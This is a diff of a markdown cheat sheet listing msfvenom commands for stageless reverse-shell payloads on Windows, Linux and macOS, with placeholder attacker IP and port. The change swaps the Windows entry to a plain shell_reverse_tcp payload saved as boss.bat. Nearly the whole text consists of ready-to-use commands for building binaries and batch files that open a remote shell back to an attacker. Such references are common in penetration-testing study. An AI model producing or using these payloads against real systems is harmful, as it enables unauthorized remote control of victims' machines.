@@ -56,7 +56,7 @@ Replace `<YOUR_IP>` and `<YOUR_PORT>` in all examples below.
 #### **Stageless Payloads**
 | OS | Command Example | Notes |
 | :--- | :--- | :--- |
-| **🪟 Windows** | `msfvenom -p windows/meterpreter_reverse_tcp lhost=<IP> lport=<PORT> -f psh-cmd > payload.bat` | Creates a batch file. |
+| **🪟 Windows** | `msfvenom -p windows/shell_reverse_tcp lhost=<IP> lport=<PORT> -f psh-cmd > boss.bat` | Creates a batch file. |
 | **🐧 Linux (x64)** | `msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=<IP> lport=<PORT> -f elf > payload.elf` | Requires `chmod +x payload.elf`. |
 | **🍎 macOS (AArch64)** | `msfvenom -p osx/aarch64/meterpreter_reverse_tcp lhost=<IP> lport=<PORT> -f macho > payload.macho` | Requires `chmod +x payload.macho`. |
 
